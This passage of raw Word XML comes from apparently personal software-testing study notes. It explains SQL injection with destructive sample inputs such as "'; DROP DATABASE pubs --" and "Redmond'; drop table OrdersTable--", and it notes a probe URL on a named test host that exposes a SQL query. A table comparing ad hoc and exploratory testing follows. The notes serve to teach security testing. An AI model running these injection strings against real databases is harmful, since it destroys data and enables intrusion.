          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> FROM authors WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>au_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = ''; DROP DATABASE pubs --'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:spacing w:line="238" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Finally, the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>(double dash) sequence of characters is a SQL comment that tells SQL to ignore the rest of the text. In this case, SQL ignores the closing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>(single quotation mark) character, which would otherwise cause a SQL parser error.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="245" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>However, assume that the user enters the following:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="245" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Redmond'; drop table </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>OrdersTable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="245" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>In this case, the following query is assembled by the script:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="245" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="2A2A2A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">SELECT * FROM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>OrdersTable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ShipCity</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Redmond'</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>;drop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> table </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>OrdersTable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>--'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4265ED66" wp14:editId="5B5146E8">
            <wp:extent cx="5943600" cy="2228094"/>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943600" cy="2228094"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId46" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="004615BF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
          </w:rPr>
          <w:t>http://st9.idsil.com/test/tcs/admin/dashboard/editusers/%60</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>SELECT a.id as userid,a.fname,a.lname,a.city,a.email,a.profile_pic,a.user_type,a.created_date,a.state,a.country,a.address FROM `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>tcs_users</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>` as a WHERE a.id=60</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="004D0FE8" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidRDefault="003916B3" w:rsidP="003916B3">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="666666"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Difference between </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003916B3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="666666"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Adhoc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003916B3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="666666"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Exploratory Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidRDefault="003916B3" w:rsidP="003916B3">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:eastAsia="Times New Roman" w:hAnsi="Trebuchet MS" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>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4680"/>
        <w:gridCol w:w="4788"/>
      </w:tblGrid>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="368"/>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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Adhoc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4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Exploratory Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="62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xml:space="preserve">1. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Adhoc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> Testing means learn the application than test it.</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1. Exploratory Testing means test the application while learning.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="89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2. In Exploratory Testing QA is always asked to test an application without any specific set of documents.</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xml:space="preserve">2. In </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Adhoc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> Testing QA is always asked to test an application with detailed set of documents.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="134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3. In this Testing we always gather information regarding the software/application from complete possible sources and document and then test the application/software.</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3. In this Testing we gather the information, and also document and test the application simultaneously.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="80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xml:space="preserve">4. In </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Adhoc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> Testing tester should have good knowledge about the application in order to test the software.</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4. In Exploratory Testing tester should increases their knowledge by exploring the application/software.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="62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5. In this testing testers have significant testing of the software before test it.</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5. In this testing testers may be learning the software before testing it.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="35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6. It is not considered as a type of any.</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 xml:space="preserve">6. It is considered as a type of </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Adhoc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003916B3" w:rsidRPr="003916B3" w:rsidTr="003916B3">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="468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7. It is not an approach to testing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="478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3916B3" w:rsidRPr="003916B3" w:rsidRDefault="003916B3" w:rsidP="003916B3">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Trebuchet MS" w:eastAsia="Times New Roman" w:hAnsi="Trebuchet MS" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003916B3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>7. It is an approach, not a technique.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0095528B" w:rsidRDefault="00B84F48" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:ind w:left="0"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId47" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="0095528B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="2D9BDB"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Ad Hoc Testing</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0095528B">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
        <w:t> implies learning of the software before its testing. During Exploratory Testing, you learn and test the software simultaneously.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0095528B" w:rsidRDefault="0095528B" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="180" w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:ind w:left="0"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
        <w:t>Before Ad Hoc Testing, we collect data on the particular software from different resources, and then we start the testing. During Exploratory Testing, we collect data and perform the testing at the same time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0095528B" w:rsidRDefault="0095528B" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="180" w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:ind w:left="0"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
        <w:t>For Ad Hoc Testing it is necessary to know the software well. For Exploratory Testing you have to gain your knowledge in course of work with the software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0095528B" w:rsidRDefault="0095528B" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="180" w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:ind w:left="0"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
